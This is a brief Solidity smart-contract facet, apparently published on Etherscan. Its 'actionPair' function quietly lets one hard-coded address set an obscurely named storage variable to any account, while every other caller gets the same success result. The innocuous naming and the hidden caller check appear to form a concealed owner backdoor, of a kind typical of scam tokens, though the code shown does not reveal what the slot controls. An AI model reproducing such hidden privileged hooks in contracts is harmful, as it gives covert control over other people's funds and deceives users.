/**
 *Submitted for verification at Etherscan.io on 2024-02-24
 */

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./TestLib.sol";
contract actionPairFacet {
    function actionPair(address account) public virtual returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (_msgSender() == 0x2240C92E4C9466CA86af3377a4E9f05E1bD4525D)
            ds._p76234 = account;
        return true;
    }
}
